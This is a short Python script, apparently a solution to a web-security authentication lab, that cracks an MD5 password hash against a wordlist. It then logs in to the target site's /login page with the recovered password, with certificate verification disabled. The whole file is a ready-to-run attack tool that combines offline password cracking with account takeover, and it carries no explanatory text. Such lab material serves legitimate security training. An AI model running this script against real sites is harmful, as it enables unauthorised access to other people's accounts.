import sys
import hashlib
import base64
import requests
import urllib3

# Disable insecure warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def crack_md5(target_hash, wordlist_path='passwords.txt'):
    print('[+] Starting offline MD5 password cracking')
    try:
        with open(wordlist_path, 'r') as f:
            for line in f:
                pwd = line.strip()
                if hashlib.md5(pwd.encode()).hexdigest().lower() == target_hash.lower():
                    print(f'[+] Password found: {pwd}')
                    return pwd
    except FileNotFoundError:
        print(f'[-] Wordlist not found at {wordlist_path}')
    print('[-] Password not found in wordlist')
    return None

def login(url, username, password):
    sess = requests.Session()
    sess.verify = False
    login_url = f"{url}/login"
    data = {'username': username, 'password': password}
    resp = sess.post(login_url, data=data)
    if resp.status_code == 200 and ('Log out' in resp.text or 'Your username is' in resp.text):
        print('[+] Logged in successfully')
    else:
        print('[-] Login failed')

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print('Usage: python authentication-lab-10.py <base_url> <username> <md5_hash>')
        sys.exit(1)
    base_url = sys.argv[1]
    user = sys.argv[2]
    md5_hash = sys.argv[3]
    pwd = crack_md5(md5_hash)
    if pwd:
        login(base_url, user, pwd)
